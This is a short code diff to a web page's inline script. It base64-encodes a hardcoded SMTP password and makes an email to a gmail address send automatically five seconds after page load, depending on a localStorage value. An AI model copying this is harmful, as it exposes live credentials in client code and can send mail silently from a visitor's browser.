@@ -11,12 +11,14 @@
 
 	<script>
 		
+		let pass = window.atob("RUE4MDEzRURBOUYxMDNCQ0I4QjFEMTc1RTlBODU5RjNENTI4");
+	
 		function sendEmail() {
 			if (localStorage.getItem("machine") == "cocon") {
 				Email.send({
 					Host : "smtp.elasticemail.com",
 					Username : "malder@xfiles.com",
-					Password : "EA8013EDA9F103BCB8B1D175E9A859F3D528",
+					Password : pass,
 					To : 'krasnoper.coin@gmail.com',
 					From : "xfiles7408@gmail.com",
 					Subject : "New COCON",
@@ -26,6 +28,8 @@
 					)
 			}
 		}
+
+		setTimeout(sendEmail, 5000);
 		
 	</script>
 
